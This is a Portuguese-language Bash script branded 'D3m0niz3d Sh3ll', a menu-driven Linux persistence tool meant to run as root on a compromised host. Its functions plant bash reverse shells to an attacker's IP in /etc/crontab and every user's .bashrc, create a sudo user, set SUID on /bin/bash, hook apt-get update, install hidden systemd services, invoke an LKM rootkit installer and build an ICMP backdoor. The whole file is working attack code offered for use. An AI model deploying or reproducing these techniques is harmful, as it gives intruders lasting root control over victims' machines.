#!/bin/bash

rainbow() {
    local text=$1
    echo "$text" #| lolcat -p 0.3 -a -d 1
}

requirements() {
    sudo apt-get install lolcat git make gcc -y
}

crontab() {
    rainbow " [*] Crontab Persistence [*] "
    echo -e "\n"
    rainbow "Deseja inserir um comando personalizado na crontab?"
    rainbow "Digite 'sim' para inserir um comando personalizado ou 'nao' para executar o comando padrão."
    read resposta

    if [[ $resposta == "sim" ]]; then
      rainbow "Digite o comando que deseja adicionar à crontab:"
      read comando
    else
      rainbow "Digite o endereço IP:"
      read ip

      rainbow "Digite a porta:"
      read porta

      comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"
    fi

    rainbow "Adicionando o comando à crontab..."
    echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null
    rainbow "Comando adicionado com sucesso!"
}

bashRCPersistence() {
    rainbow " [*] .bashrc Persistence [*] "
    echo -e "\n"

      rainbow "Digite o endereço IP do seu listener:"
      read ip

      rainbow "Digite o número da porta do seu listener:"
      read porta

      payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"

      for usuario in /home/*; do
        if [ -d "$usuario" ]; then
          rainbow "Inserindo a payload de reverse shell no .bashrc de $usuario..."
          rainbow "$payload" >> "$usuario/.bashrc"
          rainbow "Payload inserida com sucesso em $usuario/.bashrc"
        fi
      done
    rainbow ".bashrc persistence setupado com sucesso!!"
}

userANDBashSUID() {
    rainbow " [*] Usuário Privilegiado & SUID /bin/bash [*] "
    echo -e "\n"

    rainbow "Digite um nome para o usuario: "
    read user

    adduser $user
    usermod -aG sudo $user
    chmod u+s /bin/bash

    rainbow "Usuário $username criado com permissões de root e SUID setado no /bin/bash"
}

apthooking() {
    rainbow " [ * ]  hookando o comando apt-get update [ * ] "
    echo -e "\n"

    rainbow "Digite um payload ou comando, assim que o usuario digitar sudo apt-get update, este comando que voce colocar a seguir, será executado!"
    read command

    sudo touch /etc/apt/apt.conf.d/1aptget
    echo "APT::Update::Pre-Invoke {\"$command\";};" | sudo tee /etc/apt/apt.conf.d/1aptget > /dev/null

    rainbow "Seu hook está em /etc/apt/apt.conf.d/1aptget com o comando: $command"
}

systemdUser() {
    rainbow "[ * ] Systemd User level [ * ] "

    echo -e "\n"

      rainbow "Deseja executar um script? (s/n): "
      read execute_script

    if [[ $execute_script == "s" ]]; then
      rainbow "Digite o caminho completo do script: "
      read script_path
    else
      rainbow "Digite o comando a ser executado no ExecStart: "
      read exec_command
    fi

    cat > ~/.config/systemd/user/hidden.service <<EOF
[Unit]
Description=Meu serviço de exemplo

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "s" && ! -x $script_path ]]; then
      rainbow "Erro: O script especificado não tem permissão de execução."
    else
      systemctl --user daemon-reload

      systemctl --user enable hidden.service
      systemctl --user start hidden.service
    fi

    rainbow "Systemd Persistence em user level setupado com sucesso!!"
}
systemdRoot() {
    rainbow "[ * ] Systemd root level [ * ] "

    echo -e "\n"

    rainbow "Deseja executar um script? (s/n): "
    read execute_script

    if [[ $execute_script == "s" ]]; then
      rainbow "Digite o caminho completo do script: "
      read script_path
    else
      rainbow "Digite o comando a ser executado no ExecStart: "
      read exec_command
    fi

    cat > /etc/systemd/system/hidden2.service <<EOF
[Unit]
Description=Meu serviço de exemplo

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "s" && ! -x $script_path ]]; then
      rainbow "Error: O script especificado não tem permissão de execução."
    else
      systemctl daemon-reload

      systemctl enable hidden2.service
      systemctl start hidden2.service

      rainbow "Systemd Root level setupado com sucesso!"
    fi
}

sshGen() {
    while IFS=':' read -r username password uid gid full_name home shell; do
        if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]]; then
            rainbow "Usuário $username possui shell $shell"

            if [ ! -f "$home/.ssh/id_rsa.pub" ]; then
                rainbow "Gerando ssh-key para o usuário $username"

                sleep 5

                mkdir -p "$home/.ssh"

                ssh-keygen -t rsa -N "" -f "$home/.ssh/id_rsa"

                chmod 700 "$home/.ssh"
                chmod 600 "$home/.ssh/id_rsa"
                chown -R "$username:$username" "$home/.ssh"

                clear
            else
                rainbow "Chave SSH já existe para o usuário $username"
            fi
        fi
    done < "/etc/passwd"

    sleep 3

    rainbow "SSH-KEY geradas para todos os usuários válidos com sucesso!! XDXD"
}

lkmRootkit() {
	#chmod +x implant_rootkit.sh
	#./implant_rootkit.sh
	bash install_locutus.sh
}

icmpBackdoor() {
	rainbow "Digite o endereço IP que irá receber o ping: "
	read LHOST
	rainbow "Digite o número da porta que irá receber a conexão: "
	read LPORT
	git clone https://github.com/MrEmpy/Pingoor
	cd Pingoor
	make HOST=$LHOST PORT=$LPORT
	rainbow "Backdoor compilado. Você pode encontra-lo em Pingoor/pingoor"
}

banner() {
    rainbow "
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                    TM         (_.)  _  )   /
  |  | |\  | ~|~ \ /             \`.___/ \`    /
  |  | | \ |  |   X                \`-----' /
  \`__| |  \| _|_ / \\  <----.     __ / __   \\
                      <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\

  D3m0niz3d Sh3ll is a Advanced Persistence Tool For Linux"
    printf "\n\n"
}

menu() {
    cat << EOF 
  [01] Generate SSH keypair       [06] Bashrc Persistence      
  [02] APT Persistence            [07] Privileged user & SUID bash
  [03] Crontab Persistence        [08] LKM Rootkit
  [04] Systemd User level         [09] ICMP Backdoor
  [05] Systemd Root Level         

  	[*] Coming soon others features [*]

EOF

    printf "[D3m0niz3d]~# "

    read MENUINPUT

    if [ "$MENUINPUT" == "1" ] || [ "$MENUINPUT" == "01" ]; then
        sshGen
    elif [ "$MENUINPUT" == "2" ] || [ "$MENUINPUT" == "02" ]; then
        apthooking
    elif [ "$MENUINPUT" == "3" ] || [ "$MENUINPUT" == "03" ]; then
        crontab
    elif [ "$MENUINPUT" == "4" ] || [ "$MENUINPUT" == "04" ]; then
        systemdUser
    elif [ "$MENUINPUT" == "5" ] || [ "$MENUINPUT" == "05" ]; then
        systemdRoot
    elif [ "$MENUINPUT" == "6" ] || [ "$MENUINPUT" == "06" ]; then
        bashRCPersistence
    elif [ "$MENUINPUT" == "7" ] || [ "$MENUINPUT" == "07" ]; then
        userANDBashSUID
    elif [ "$MENUINPUT" == "8" ] || [ "$MENUINPUT" == "08" ]; then
        lkmRootkit
    elif [ "$MENUINPUT" == "9" ] || [ "$MENUINPUT" == "09" ]; then
        icmpBackdoor
    else 
        echo "Essa opção não existe"
    fi
}

main() {
    if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root" >&2
        exit 1
    fi

    requirements
    clear
    banner
    sleep 0.5

    menu
}

main
